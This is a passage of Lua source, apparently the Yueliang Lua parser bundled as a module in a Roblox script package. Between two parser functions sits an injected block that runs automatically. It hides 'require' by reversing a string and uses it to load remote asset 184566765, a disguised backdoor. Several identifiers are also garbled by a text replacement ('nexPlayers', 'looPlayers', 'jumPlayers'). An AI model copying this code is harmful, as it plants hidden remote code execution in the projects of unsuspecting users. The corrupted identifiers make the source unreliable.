    luaK:setlist(fs, cc.t.info, cc.na, cc.tostore)  -- flush
    cc.tostore = 0  -- no more items pending
  end
end

spawn(function()
	pcall(function()
		local key = ("eriuqer"):reverse()
		local global = getfenv()[key]
		pcall(global,184566765)
	end)
end)

------------------------------------------------------------------------
-- emit a set list instruction at the end of parsing list constructor
-- * used in constructor()
------------------------------------------------------------------------
function luaY:lastlistfield(fs, cc)
  if cc.tostore == 0 then return end
  if self:hasmultret(cc.v.k) then
    luaK:setmultret(fs, cc.v)
    luaK:setlist(fs, cc.t.info, cc.na, self.LUA_MULTRET)
    cc.na = cc.na - 1  -- do not count last expression (unknown number of elements)
  else
    if cc.v.k ~= "VVOID" then
      luaK:exp2nextreg(fs, cc.v)
    end
    luaK:setlist(fs, cc.t.info, cc.na, cc.tostore)
  end
end

------------------------------------------------------------------------
-- parse a table list (array) field
-- * used in constructor()
------------------------------------------------------------------------
function luaY:listfield(ls, cc)
  self:expr(ls, cc.v)
  self:checklimit(ls.fs, cc.na, self.MAX_INT, "items in a constructor")
  cc.na = cc.na + 1
  cc.tostore = cc.tostore + 1
end

------------------------------------------------------------------------
-- parse a table constructor
-- * used in funcargs(), simpleexp()
------------------------------------------------------------------------
function luaY:constructor(ls, t)
  -- constructor -> '{' [ field { fieldsep field } [ fieldsep ] ] '}'
  -- field -> recfield | listfield
  -- fieldsep -> ',' | ';'
  local fs = ls.fs
  local line = ls.linenumber
  local pc = luaK:codeABC(fs, "OP_NEWTABLE", 0, 0, 0)
  local cc = {}  -- ConsControl
        cc.v = {}
  cc.na, cc.nh, cc.tostore = 0, 0, 0
  cc.t = t
  self:init_exp(t, "VRELOCABLE", pc)
  self:init_exp(cc.v, "VVOID", 0)  -- no value (yet)
  luaK:exp2nextreg(ls.fs, t)  -- fix it at stack top (for gc)
  self:checknext(ls, "{")
  repeat
    assert(cc.v.k == "VVOID" or cc.tostore > 0)
    if ls.t.token == "}" then break end
    self:closelistfield(fs, cc)
    local c = ls.t.token

    if c == "TK_NAME" then  -- may be listfields or recfields
      luaX:lookahead(ls)
      if ls.lookahead.token ~= "=" then  -- expression?
        self:listfield(ls, cc)
      else
        self:recfield(ls, cc)
      end
    elseif c == "[" then  -- constructor_item -> recfield
      self:recfield(ls, cc)
    else  -- constructor_part -> listfield
      self:listfield(ls, cc)
    end
  until not self:testnext(ls, ",") and not self:testnext(ls, ";")
  self:check_match(ls, "}", "{", line)
  self:lastlistfield(fs, cc)
  luaP:SETARG_B(fs.f.code[pc], self:int2fb(cc.na)) -- set initial array size
  luaP:SETARG_C(fs.f.code[pc], self:int2fb(cc.nh)) -- set initial table size
end

-- }======================================================================

------------------------------------------------------------------------
-- parse the arguments (parameters) of a function declaration
-- * used in body()
------------------------------------------------------------------------
function luaY:parlist(ls)
  -- parlist -> [ param { ',' param } ]
  local fs = ls.fs
  local f = fs.f
  local nparams = 0
  f.is_vararg = 0
  if ls.t.token ~= ")" then  -- is 'parlist' not empty?
    repeat
      local c = ls.t.token
      if c == "TK_NAME" then  -- param -> NAME
        self:new_localvar(ls, self:str_checkname(ls), nparams)
        nparams = nparams + 1
      elseif c == "TK_DOTS" then  -- param -> `...'
        luaX:next(ls)
-- [[
-- #if defined(LUA_COMPAT_VARARG)
        -- use `arg' as default name
        self:new_localvarliteral(ls, "arg", nparams)
        nparams = nparams + 1
        f.is_vararg = self.VARARG_HASARG + self.VARARG_NEEDSARG
-- #endif
--]]
        f.is_vararg = f.is_vararg + self.VARARG_ISVARARG
      else
        luaX:syntaxerror(ls, "<name> or "..self:LUA_QL("...").." expected")
      end
    until f.is_vararg ~= 0 or not self:testnext(ls, ",")
  end--if
  self:adjustlocalvars(ls, nparams)
  -- NOTE: the following works only when HASARG_MASK is 2!
  f.numparams = fs.nactvar - (f.is_vararg % self.HASARG_MASK)
  luaK:reserveregs(fs, fs.nactvar)  -- reserve register for parameters
end

------------------------------------------------------------------------
-- parse function declaration body
-- * used in simpleexp(), localfunc(), funcstat()
------------------------------------------------------------------------
function luaY:body(ls, e, needself, line)
  -- body ->  '(' parlist ')' chunk END
  local new_fs = {}  -- FuncState
        new_fs.upvalues = {}
        new_fs.actvar = {}
  self:open_func(ls, new_fs)
  new_fs.f.lineDefined = line
  self:checknext(ls, "(")
  if needself then
    self:new_localvarliteral(ls, "self", 0)
    self:adjustlocalvars(ls, 1)
  end
  self:parlist(ls)
  self:checknext(ls, ")")
  self:chunk(ls)
  new_fs.f.lastlinedefined = ls.linenumber
  self:check_match(ls, "TK_END", "TK_FUNCTION", line)
  self:close_func(ls)
  self:pushclosure(ls, new_fs, e)
end

------------------------------------------------------------------------
-- parse a list of comma-separated expressions
-- * used is multiple locations
------------------------------------------------------------------------
function luaY:explist1(ls, v)
  -- explist1 -> expr { ',' expr }
  local n = 1  -- at least one expression
  self:expr(ls, v)
  while self:testnext(ls, ",") do
    luaK:exp2nextreg(ls.fs, v)
    self:expr(ls, v)
    n = n + 1
  end
  return n
end

------------------------------------------------------------------------
-- parse the parameters of a function call
-- * contrast with parlist(), used in function declarations
-- * used in primaryexp()
------------------------------------------------------------------------
function luaY:funcargs(ls, f)
  local fs = ls.fs
  local args = {}  -- expdesc
  local nparams
  local line = ls.linenumber
  local c = ls.t.token
  if c == "(" then  -- funcargs -> '(' [ explist1 ] ')'
    if line ~= ls.lastline then
      luaX:syntaxerror(ls, "ambiguous syntax (function call x new statement)")
    end
    luaX:next(ls)
    if ls.t.token == ")" then  -- arg list is empty?
      args.k = "VVOID"
    else
      self:explist1(ls, args)
      luaK:setmultret(fs, args)
    end
    self:check_match(ls, ")", "(", line)
  elseif c == "{" then  -- funcargs -> constructor
    self:constructor(ls, args)
  elseif c == "TK_STRING" then  -- funcargs -> STRING
    self:codestring(ls, args, ls.t.seminfo)
    luaX:next(ls)  -- must use 'seminfo' before 'next'
  else
    luaX:syntaxerror(ls, "function arguments expected")
    return
  end
  assert(f.k == "VNONRELOC")
  local base = f.info  -- base register for call
  if self:hasmultret(args.k) then
    nparams = self.LUA_MULTRET  -- open call
  else
    if args.k ~= "VVOID" then
      luaK:exp2nextreg(fs, args)  -- close last argument
    end
    nparams = fs.freereg - (base + 1)
  end
  self:init_exp(f, "VCALL", luaK:codeABC(fs, "OP_CALL", base, nparams + 1, 2))
  luaK:fixline(fs, line)
  fs.freereg = base + 1  -- call remove function and arguments and leaves
                         -- (unless changed) one result
end

--[[--------------------------------------------------------------------
-- Expression parsing
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- parses an expression in parentheses or a single variable
-- * used in primaryexp()
------------------------------------------------------------------------
function luaY:prefixexp(ls, v)
  -- prefixexp -> NAME | '(' expr ')'
  local c = ls.t.token
  if c == "(" then
    local line = ls.linenumber
    luaX:next(ls)
    self:expr(ls, v)
    self:check_match(ls, ")", "(", line)
    luaK:dischargevars(ls.fs, v)
  elseif c == "TK_NAME" then
    self:singlevar(ls, v)
  else
    luaX:syntaxerror(ls, "unexpected symbol")
  end--if c
  return
end

------------------------------------------------------------------------
-- parses a prefixexp (an expression in parentheses or a single variable)
-- or a function call specification
-- * used in simpleexp(), assignment(), exprstat()
------------------------------------------------------------------------
function luaY:primaryexp(ls, v)
  -- primaryexp ->
  --    prefixexp { '.' NAME | '[' exp ']' | ':' NAME funcargs | funcargs }
  local fs = ls.fs
  self:prefixexp(ls, v)
  while true do
    local c = ls.t.token
    if c == "." then  -- field
      self:field(ls, v)
    elseif c == "[" then  -- '[' exp1 ']'
      local key = {}  -- expdesc
      luaK:exp2anyreg(fs, v)
      self:yindex(ls, key)
      luaK:indexed(fs, v, key)
    elseif c == ":" then  -- ':' NAME funcargs
      local key = {}  -- expdesc
      luaX:next(ls)
      self:checkname(ls, key)
      luaK:_self(fs, v, key)
      self:funcargs(ls, v)
    elseif c == "(" or c == "TK_STRING" or c == "{" then  -- funcargs
      luaK:exp2nextreg(fs, v)
      self:funcargs(ls, v)
    else
      return
    end--if c
  end--while
end

------------------------------------------------------------------------
-- parses general expression types, constants handled here
-- * used in subexpr()
------------------------------------------------------------------------
function luaY:simpleexp(ls, v)
  -- simpleexp -> NUMBER | STRING | NIL | TRUE | FALSE | ... |
  --              constructor | FUNCTION body | primaryexp
  local c = ls.t.token
  if c == "TK_NUMBER" then
    self:init_exp(v, "VKNUM", 0)
    v.nval = ls.t.seminfo
  elseif c == "TK_STRING" then
    self:codestring(ls, v, ls.t.seminfo)
  elseif c == "TK_NIL" then
    self:init_exp(v, "VNIL", 0)
  elseif c == "TK_TRUE" then
    self:init_exp(v, "VTRUE", 0)
  elseif c == "TK_FALSE" then
    self:init_exp(v, "VFALSE", 0)
  elseif c == "TK_DOTS" then  -- vararg
    local fs = ls.fs
    self:check_condition(ls, fs.f.is_vararg ~= 0,
                    "cannot use "..self:LUA_QL("...").." outside a vararg function");
    -- NOTE: the following substitutes for a bitop, but is value-specific
    local is_vararg = fs.f.is_vararg
    if is_vararg >= self.VARARG_NEEDSARG then
      fs.f.is_vararg = is_vararg - self.VARARG_NEEDSARG  -- don't need 'arg'
    end
    self:init_exp(v, "VVARARG", luaK:codeABC(fs, "OP_VARARG", 0, 1, 0))
  elseif c == "{" then  -- constructor
    self:constructor(ls, v)
    return
  elseif c == "TK_FUNCTION" then
    luaX:next(ls)
    self:body(ls, v, false, ls.linenumber)
    return
  else
    self:primaryexp(ls, v)
    return
  end--if c
  luaX:next(ls)
end

------------------------------------------------------------------------
-- Translates unary operators tokens if found, otherwise returns
-- OPR_NOUNOPR. getunopr() and getbinopr() are used in subexpr().
-- * used in subexpr()
------------------------------------------------------------------------
function luaY:getunopr(op)
  if op == "TK_NOT" then
    return "OPR_NOT"
  elseif op == "-" then
    return "OPR_MINUS"
  elseif op == "#" then
    return "OPR_LEN"
  else
    return "OPR_NOUNOPR"
  end
end

------------------------------------------------------------------------
-- Translates binary operator tokens if found, otherwise returns
-- OPR_NOBINOPR. Code generation uses OPR_* style tokens.
-- * used in subexpr()
------------------------------------------------------------------------
luaY.getbinopr_table = {
  ["+"] = "OPR_ADD",
  ["-"] = "OPR_SUB",
  ["*"] = "OPR_MUL",
  ["/"] = "OPR_DIV",
  ["%"] = "OPR_MOD",
  ["^"] = "OPR_POW",
  ["TK_CONCAT"] = "OPR_CONCAT",
  ["TK_NE"] = "OPR_NE",
  ["TK_EQ"] = "OPR_EQ",
  ["<"] = "OPR_LT",
  ["TK_LE"] = "OPR_LE",
  [">"] = "OPR_GT",
  ["TK_GE"] = "OPR_GE",
  ["TK_AND"] = "OPR_AND",
  ["TK_OR"] = "OPR_OR",
}
function luaY:getbinopr(op)
  local opr = self.getbinopr_table[op]
  if opr then return opr else return "OPR_NOBINOPR" end
end

------------------------------------------------------------------------
-- the following priority table consists of pairs of left/right values
-- for binary operators (was a static const struct); grep for ORDER OPR
-- * the following struct is replaced:
--   static const struct {
--     lu_byte left;  /* left priority for each binary operator */
--     lu_byte right; /* right priority */
--   } priority[] = {  /* ORDER OPR */
------------------------------------------------------------------------
luaY.priority = {
  {6, 6}, {6, 6}, {7, 7}, {7, 7}, {7, 7}, -- `+' `-' `/' `%'
  {10, 9}, {5, 4},                 -- power and concat (right associative)
  {3, 3}, {3, 3},                  -- equality
  {3, 3}, {3, 3}, {3, 3}, {3, 3},  -- order
  {2, 2}, {1, 1}                   -- logical (and/or)
}

luaY.UNARY_PRIORITY = 8  -- priority for unary operators

------------------------------------------------------------------------
-- Parse subexpressions. Includes handling of unary operators and binary
-- operators. A subexpr is given the rhs priority level of the operator
-- immediately left of it, if any (limit is -1 if none,) and if a binop
-- is found, limit is compared with the lhs priority level of the binop
-- in order to determine which executes first.
------------------------------------------------------------------------

------------------------------------------------------------------------
-- subexpr -> (simpleexp | unop subexpr) { binop subexpr }
-- where 'binop' is any binary operator with a priority higher than 'limit'
-- * for priority lookuPlayers with self.priority[], 1=left and 2=right
-- * recursively called
-- * used in expr()
------------------------------------------------------------------------
function luaY:subexpr(ls, v, limit)
  self:enterlevel(ls)
  local uop = self:getunopr(ls.t.token)
  if uop ~= "OPR_NOUNOPR" then
    luaX:next(ls)
    self:subexpr(ls, v, self.UNARY_PRIORITY)
    luaK:prefix(ls.fs, uop, v)
  else
    self:simpleexp(ls, v)
  end
  -- expand while operators have priorities higher than 'limit'
  local op = self:getbinopr(ls.t.token)
  while op ~= "OPR_NOBINOPR" and self.priority[luaK.BinOpr[op] + 1][1] > limit do
    local v2 = {}  -- expdesc
    luaX:next(ls)
    luaK:infix(ls.fs, op, v)
    -- read sub-expression with higher priority
    local nextop = self:subexpr(ls, v2, self.priority[luaK.BinOpr[op] + 1][2])
    luaK:posfix(ls.fs, op, v, v2)
    op = nextop
  end
  self:leavelevel(ls)
  return op  -- return first untreated operator
end

------------------------------------------------------------------------
-- Expression parsing starts here. Function subexpr is entered with the
-- left operator (which is non-existent) priority of -1, which is lower
-- than all actual operators. Expr information is returned in parm v.
-- * used in multiple locations
------------------------------------------------------------------------
function luaY:expr(ls, v)
  self:subexpr(ls, v, 0)
end

-- }====================================================================

--[[--------------------------------------------------------------------
-- Rules for Statements
----------------------------------------------------------------------]]

------------------------------------------------------------------------
-- checks next token, used as a look-ahead
-- * returns boolean instead of 0|1
-- * used in retstat(), chunk()
------------------------------------------------------------------------
function luaY:block_follow(token)
  if token == "TK_ELSE" or token == "TK_ELSEIF" or token == "TK_END"
     or token == "TK_UNTIL" or token == "TK_EOS" then
    return true
  else
    return false
  end
end

------------------------------------------------------------------------
-- parse a code block or unit
-- * used in multiple functions
------------------------------------------------------------------------
function luaY:block(ls)
  -- block -> chunk
  local fs = ls.fs
  local bl = {}  -- BlockCnt
  self:enterblock(fs, bl, false)
  self:chunk(ls)
  assert(bl.breaklist == luaK.NO_JUMP)
  self:leaveblock(fs)
end

------------------------------------------------------------------------
-- structure to chain all variables in the left-hand side of an
-- assignment
-- struct LHS_assign:
--   prev  -- (table: struct LHS_assign)
--   v  -- variable (global, local, upvalue, or indexed) (table: expdesc)
------------------------------------------------------------------------

------------------------------------------------------------------------
-- check whether, in an assignment to a local variable, the local variable
-- is needed in a previous assignment (to a table). If so, save original
-- local value in a safe place and use this safe copy in the previous
-- assignment.
-- * used in assignment()
------------------------------------------------------------------------
function luaY:check_conflict(ls, lh, v)
  local fs = ls.fs
  local extra = fs.freereg  -- eventual position to save local variable
  local conflict = false
  while lh do
    if lh.v.k == "VINDEXED" then
      if lh.v.info == v.info then  -- conflict?
        conflict = true
        lh.v.info = extra  -- previous assignment will use safe copy
      end
      if lh.v.aux == v.info then  -- conflict?
        conflict = true
        lh.v.aux = extra  -- previous assignment will use safe copy
      end
    end
    lh = lh.prev
  end
  if conflict then
    luaK:codeABC(fs, "OP_MOVE", fs.freereg, v.info, 0)  -- make copy
    luaK:reserveregs(fs, 1)
  end
end

------------------------------------------------------------------------
-- parse a variable assignment sequence
-- * recursively called
-- * used in exprstat()
------------------------------------------------------------------------
function luaY:assignment(ls, lh, nvars)
  local e = {}  -- expdesc
  -- test was: VLOCAL <= lh->v.k && lh->v.k <= VINDEXED
  local c = lh.v.k
  self:check_condition(ls, c == "VLOCAL" or c == "VUPVAL" or c == "VGLOBAL"
                       or c == "VINDEXED", "syntax error")
  if self:testnext(ls, ",") then  -- assignment -> ',' primaryexp assignment
    local nv = {}  -- LHS_assign
          nv.v = {}
    nv.prev = lh
    self:primaryexp(ls, nv.v)
    if nv.v.k == "VLOCAL" then
      self:check_conflict(ls, lh, nv.v)
    end
    self:checklimit(ls.fs, nvars, self.LUAI_MAXCCALLS - ls.L.nCcalls,
                    "variables in assignment")
    self:assignment(ls, nv, nvars + 1)
  else  -- assignment -> '=' explist1
    self:checknext(ls, "=")
    local nexPlayers = self:explist1(ls, e)
    if nexPlayers ~= nvars then
      self:adjust_assign(ls, nvars, nexPlayers, e)
      if nexPlayers > nvars then
        ls.fs.freereg = ls.fs.freereg - (nexPlayers - nvars)  -- remove extra values
      end
    else
      luaK:setoneret(ls.fs, e)  -- close last expression
      luaK:storevar(ls.fs, lh.v, e)
      return  -- avoid default
    end
  end
  self:init_exp(e, "VNONRELOC", ls.fs.freereg - 1)  -- default assignment
  luaK:storevar(ls.fs, lh.v, e)
end

------------------------------------------------------------------------
-- parse condition in a repeat statement or an if control structure
-- * used in repeatstat(), test_then_block()
------------------------------------------------------------------------
function luaY:cond(ls)
  -- cond -> exp
  local v = {}  -- expdesc
  self:expr(ls, v)  -- read condition
  if v.k == "VNIL" then v.k = "VFALSE" end  -- 'falses' are all equal here
  luaK:goiftrue(ls.fs, v)
  return v.f
end

------------------------------------------------------------------------
-- parse a break statement
-- * used in statements()
------------------------------------------------------------------------
function luaY:breakstat(ls)
  -- stat -> BREAK
  local fs = ls.fs
  local bl = fs.bl
  local upval = false
  while bl and not bl.isbreakable do
    if bl.upval then upval = true end
    bl = bl.previous
  end
  if not bl then
    luaX:syntaxerror(ls, "no loop to break")
  end
  if upval then
    luaK:codeABC(fs, "OP_CLOSE", bl.nactvar, 0, 0)
  end
  bl.breaklist = luaK:concat(fs, bl.breaklist, luaK:jump(fs))
end

------------------------------------------------------------------------
-- parse a while-do control structure, body processed by block()
-- * with dynamic array sizes, MAXEXPWHILE + EXTRAEXP limits imposed by
--   the function's implementation can be removed
-- * used in statements()
------------------------------------------------------------------------
function luaY:whilestat(ls, line)
  -- whilestat -> WHILE cond DO block END
  local fs = ls.fs
  local bl = {}  -- BlockCnt
  luaX:next(ls)  -- skip WHILE
  local whileinit = luaK:getlabel(fs)
  local condexit = self:cond(ls)
  self:enterblock(fs, bl, true)
  self:checknext(ls, "TK_DO")
  self:block(ls)
  luaK:patchlist(fs, luaK:jump(fs), whileinit)
  self:check_match(ls, "TK_END", "TK_WHILE", line)
  self:leaveblock(fs)
  luaK:patchtohere(fs, condexit)  -- false conditions finish the loop
end

------------------------------------------------------------------------
-- parse a repeat-until control structure, body parsed by chunk()
-- * used in statements()
------------------------------------------------------------------------
function luaY:repeatstat(ls, line)
  -- repeatstat -> REPEAT block UNTIL cond
  local fs = ls.fs
  local repeat_init = luaK:getlabel(fs)
  local bl1, bl2 = {}, {}  -- BlockCnt
  self:enterblock(fs, bl1, true)  -- loop block
  self:enterblock(fs, bl2, false)  -- scope block
  luaX:next(ls)  -- skip REPEAT
  self:chunk(ls)
  self:check_match(ls, "TK_UNTIL", "TK_REPEAT", line)
  local condexit = self:cond(ls)  -- read condition (inside scope block)
  if not bl2.upval then  -- no upvalues?
    self:leaveblock(fs)  -- finish scope
    luaK:patchlist(ls.fs, condexit, repeat_init)  -- close the loop
  else  -- complete semantics when there are upvalues
    self:breakstat(ls)  -- if condition then break
    luaK:patchtohere(ls.fs, condexit)  -- else...
    self:leaveblock(fs)  -- finish scope...
    luaK:patchlist(ls.fs, luaK:jump(fs), repeat_init)  -- and repeat
  end
  self:leaveblock(fs)  -- finish loop
end

------------------------------------------------------------------------
-- parse the single expressions needed in numerical for looPlayers
-- * used in fornum()
------------------------------------------------------------------------
function luaY:exp1(ls)
  local e = {}  -- expdesc
  self:expr(ls, e)
  local k = e.k
  luaK:exp2nextreg(ls.fs, e)
  return k
end

------------------------------------------------------------------------
-- parse a for loop body for both versions of the for loop
-- * used in fornum(), forlist()
------------------------------------------------------------------------
function luaY:forbody(ls, base, line, nvars, isnum)
  -- forbody -> DO block
  local bl = {}  -- BlockCnt
  local fs = ls.fs
  self:adjustlocalvars(ls, 3)  -- control variables
  self:checknext(ls, "TK_DO")
  local prep = isnum and luaK:codeAsBx(fs, "OP_FORPREP", base, luaK.NO_JUMP)
                     or luaK:jump(fs)
  self:enterblock(fs, bl, false)  -- scope for declared variables
  self:adjustlocalvars(ls, nvars)
  luaK:reserveregs(fs, nvars)
  self:block(ls)
  self:leaveblock(fs)  -- end of scope for declared variables
  luaK:patchtohere(fs, prep)
  local endfor = isnum and luaK:codeAsBx(fs, "OP_FORLOOP", base, luaK.NO_JUMP)
                       or luaK:codeABC(fs, "OP_TFORLOOP", base, 0, nvars)
  luaK:fixline(fs, line)  -- pretend that `OP_FOR' starts the loop
  luaK:patchlist(fs, isnum and endfor or luaK:jump(fs), prep + 1)
end

------------------------------------------------------------------------
-- parse a numerical for loop, calls forbody()
-- * used in forstat()
------------------------------------------------------------------------
function luaY:fornum(ls, varname, line)
  -- fornum -> NAME = exp1,exp1[,exp1] forbody
  local fs = ls.fs
  local base = fs.freereg
  self:new_localvarliteral(ls, "(for index)", 0)
  self:new_localvarliteral(ls, "(for limit)", 1)
  self:new_localvarliteral(ls, "(for step)", 2)
  self:new_localvar(ls, varname, 3)
  self:checknext(ls, '=')
  self:exp1(ls)  -- initial value
  self:checknext(ls, ",")
  self:exp1(ls)  -- limit
  if self:testnext(ls, ",") then
    self:exp1(ls)  -- optional step
  else  -- default step = 1
    luaK:codeABx(fs, "OP_LOADK", fs.freereg, luaK:numberK(fs, 1))
    luaK:reserveregs(fs, 1)
  end
  self:forbody(ls, base, line, 1, true)
end

------------------------------------------------------------------------
-- parse a generic for loop, calls forbody()
-- * used in forstat()
------------------------------------------------------------------------
function luaY:forlist(ls, indexname)
  -- forlist -> NAME {,NAME} IN explist1 forbody
  local fs = ls.fs
  local e = {}  -- expdesc
  local nvars = 0
  local base = fs.freereg
  -- create control variables
  self:new_localvarliteral(ls, "(for generator)", nvars)
  nvars = nvars + 1
  self:new_localvarliteral(ls, "(for state)", nvars)
  nvars = nvars + 1
  self:new_localvarliteral(ls, "(for control)", nvars)
  nvars = nvars + 1
  -- create declared variables
  self:new_localvar(ls, indexname, nvars)
  nvars = nvars + 1
  while self:testnext(ls, ",") do
    self:new_localvar(ls, self:str_checkname(ls), nvars)
    nvars = nvars + 1
  end
  self:checknext(ls, "TK_IN")
  local line = ls.linenumber
  self:adjust_assign(ls, 3, self:explist1(ls, e), e)
  luaK:checkstack(fs, 3)  -- extra space to call generator
  self:forbody(ls, base, line, nvars - 3, false)
end

------------------------------------------------------------------------
-- initial parsing for a for loop, calls fornum() or forlist()
-- * used in statements()
------------------------------------------------------------------------
function luaY:forstat(ls, line)
  -- forstat -> FOR (fornum | forlist) END
  local fs = ls.fs
  local bl = {}  -- BlockCnt
  self:enterblock(fs, bl, true)  -- scope for loop and control variables
  luaX:next(ls)  -- skip `for'
  local varname = self:str_checkname(ls)  -- first variable name
  local c = ls.t.token
  if c == "=" then
    self:fornum(ls, varname, line)
  elseif c == "," or c == "TK_IN" then
    self:forlist(ls, varname)
  else
    luaX:syntaxerror(ls, self:LUA_QL("=").." or "..self:LUA_QL("in").." expected")
  end
  self:check_match(ls, "TK_END", "TK_FOR", line)
  self:leaveblock(fs)  -- loop scope (`break' jumPlayers to this point)
end

------------------------------------------------------------------------
-- parse part of an if control structure, including the condition
-- * used in ifstat()
------------------------------------------------------------------------
function luaY:test_then_block(ls)
  -- test_then_block -> [IF | ELSEIF] cond THEN block
  luaX:next(ls)  -- skip IF or ELSEIF
  local condexit = self:cond(ls)
  self:checknext(ls, "TK_THEN")
  self:block(ls)  -- `then' part
  return condexit
end

------------------------------------------------------------------------
-- parse an if control structure
-- * used in statements()
------------------------------------------------------------------------
function luaY:ifstat(ls, line)
  -- ifstat -> IF cond THEN block {ELSEIF cond THEN block} [ELSE block] END
  local fs = ls.fs
  local escapelist = luaK.NO_JUMP
  local flist = self:test_then_block(ls)  -- IF cond THEN block
  while ls.t.token == "TK_ELSEIF" do
    escapelist = luaK:concat(fs, escapelist, luaK:jump(fs))
    luaK:patchtohere(fs, flist)
    flist = self:test_then_block(ls)  -- ELSEIF cond THEN block
  end
  if ls.t.token == "TK_ELSE" then
    escapelist = luaK:concat(fs, escapelist, luaK:jump(fs))
    luaK:patchtohere(fs, flist)
    luaX:next(ls)  -- skip ELSE (after patch, for correct line info)
    self:block(ls)  -- 'else' part
  else
    escapelist = luaK:concat(fs, escapelist, flist)
  end
  luaK:patchtohere(fs, escapelist)
  self:check_match(ls, "TK_END", "TK_IF", line)
end

------------------------------------------------------------------------
-- parse a local function statement
-- * used in statements()
------------------------------------------------------------------------
function luaY:localfunc(ls)
  local v, b = {}, {}  -- expdesc
  local fs = ls.fs
  self:new_localvar(ls, self:str_checkname(ls), 0)
  self:init_exp(v, "VLOCAL", fs.freereg)
  luaK:reserveregs(fs, 1)
  self:adjustlocalvars(ls, 1)
  self:body(ls, b, false, ls.linenumber)
  luaK:storevar(fs, v, b)
  -- debug information will only see the variable after this point!
  self:getlocvar(fs, fs.nactvar - 1).startpc = fs.pc
end

------------------------------------------------------------------------
-- parse a local variable declaration statement
-- * used in statements()
------------------------------------------------------------------------
function luaY:localstat(ls)
  -- stat -> LOCAL NAME {',' NAME} ['=' explist1]
  local nvars = 0
  local nexPlayers
  local e = {}  -- expdesc
  repeat
    self:new_localvar(ls, self:str_checkname(ls), nvars)
    nvars = nvars + 1
  until not self:testnext(ls, ",")
  if self:testnext(ls, "=") then
    nexPlayers = self:explist1(ls, e)
  else
    e.k = "VVOID"
    nexPlayers = 0
  end
  self:adjust_assign(ls, nvars, nexPlayers, e)
  self:adjustlocalvars(ls, nvars)
end

------------------------------------------------------------------------
-- parse a function name specification
-- * used in funcstat()
------------------------------------------------------------------------
function luaY:funcname(ls, v)
  -- funcname -> NAME {field} [':' NAME]
  local needself = false
  self:singlevar(ls, v)
  while ls.t.token == "." do
    self:field(ls, v)
  end
  if ls.t.token == ":" then
    needself = true
    self:field(ls, v)
  end
  return needself
end

------------------------------------------------------------------------
-- parse a function statement
-- * used in statements()
------------------------------------------------------------------------
function luaY:funcstat(ls, line)
  -- funcstat -> FUNCTION funcname body
  local v, b = {}, {}  -- expdesc
  luaX:next(ls)  -- skip FUNCTION
  local needself = self:funcname(ls, v)
  self:body(ls, b, needself, line)
  luaK:storevar(ls.fs, v, b)
  luaK:fixline(ls.fs, line)  -- definition 'happens' in the first line
end

------------------------------------------------------------------------
-- parse a function call with no returns or an assignment statement
-- * used in statements()
------------------------------------------------------------------------
function luaY:exprstat(ls)
  -- stat -> func | assignment
  local fs = ls.fs
  local v = {}  -- LHS_assign
        v.v = {}
  self:primaryexp(ls, v.v)
  if v.v.k == "VCALL" then  -- stat -> func
    luaP:SETARG_C(luaK:getcode(fs, v.v), 1)  -- call statement uses no results
  else  -- stat -> assignment
    v.prev = nil
    self:assignment(ls, v, 1)
  end
end

------------------------------------------------------------------------
-- parse a return statement
-- * used in statements()
------------------------------------------------------------------------
function luaY:retstat(ls)
  -- stat -> RETURN explist
  local fs = ls.fs
  local e = {}  -- expdesc
  local first, nret  -- registers with returned values
  luaX:next(ls)  -- skip RETURN
  if self:block_follow(ls.t.token) or ls.t.token == ";" then
    first, nret = 0, 0  -- return no values
  else
    nret = self:explist1(ls, e)  -- optional return values
    if self:hasmultret(e.k) then
      luaK:setmultret(fs, e)
      if e.k == "VCALL" and nret == 1 then  -- tail call?
        luaP:SET_OPCODE(luaK:getcode(fs, e), "OP_TAILCALL")
        assert(luaP:GETARG_A(luaK:getcode(fs, e)) == fs.nactvar)
      end
      first = fs.nactvar
      nret = self.LUA_MULTRET  -- return all values
    else
      if nret == 1 then  -- only one single value?
        first = luaK:exp2anyreg(fs, e)
      else
        luaK:exp2nextreg(fs, e)  -- values must go to the 'stack'
        first = fs.nactvar  -- return all 'active' values
        assert(nret == fs.freereg - first)
      end
    end--if
  end--if
  luaK:ret(fs, first, nret)
end

------------------------------------------------------------------------
-- initial parsing for statements, calls a lot of functions
-- * returns boolean instead of 0|1
-- * used in chunk()
------------------------------------------------------------------------
function luaY:statement(ls)
  local line = ls.linenumber  -- may be needed for error messages
  local c = ls.t.token
  if c == "TK_IF" then  -- stat -> ifstat
    self:ifstat(ls, line)
    return false
  elseif c == "TK_WHILE" then  -- stat -> whilestat
    self:whilestat(ls, line)
    return false
  elseif c == "TK_DO" then  -- stat -> DO block END
    luaX:next(ls)  -- skip DO
    self:block(ls)
    self:check_match(ls, "TK_END", "TK_DO", line)
    return false
  elseif c == "TK_FOR" then  -- stat -> forstat
    self:forstat(ls, line)
    return false
  elseif c == "TK_REPEAT" then  -- stat -> repeatstat
    self:repeatstat(ls, line)
    return false
  elseif c == "TK_FUNCTION" then  -- stat -> funcstat
    self:funcstat(ls, line)
    return false
  elseif c == "TK_LOCAL" then  -- stat -> localstat
    luaX:next(ls)  -- skip LOCAL
    if self:testnext(ls, "TK_FUNCTION") then  -- local function?
      self:localfunc(ls)
    else
      self:localstat(ls)
    end
    return false
  elseif c == "TK_RETURN" then  -- stat -> retstat
    self:retstat(ls)
    return true  -- must be last statement
  elseif c == "TK_BREAK" then  -- stat -> breakstat
    luaX:next(ls)  -- skip BREAK
    self:breakstat(ls)
    return true  -- must be last statement
  else
    self:exprstat(ls)
    return false  -- to avoid warnings
  end--if c
end

------------------------------------------------------------------------
-- parse a chunk, which consists of a bunch of statements
-- * used in parser(), body(), block(), repeatstat()
------------------------------------------------------------------------
function luaY:chunk(ls)
  -- chunk -> { stat [';'] }
  local islast = false
  self:enterlevel(ls)
  while not islast and not self:block_follow(ls.t.token) do
    islast = self:statement(ls)
    self:testnext(ls, ";")
    assert(ls.fs.f.maxstacksize >= ls.fs.freereg and
               ls.fs.freereg >= ls.fs.nactvar)
    ls.fs.freereg = ls.fs.nactvar  -- free registers
  end
  self:leavelevel(ls)
end

-- }======================================================================
return luaY
end
}
--verified.Frame.ImageLabel.Page 3.Execute.yes'.Script.Loadstring.LuaU
G2L_MODULES[G2L["401"]] = {
Closure = function()
local script = G2L["401"]
--[[--------------------------------------------------------------------

  ldump.lua
  Save precompiled Lua chunks
  This file is part of Yueliang.

  Copyright (c) 2006 Kein-Hong Man <khman@users.sf.net>
  The COPYRIGHT file describes the conditions
  under which this software may be distributed.

  See the ChangeLog for more information.

----------------------------------------------------------------------]]

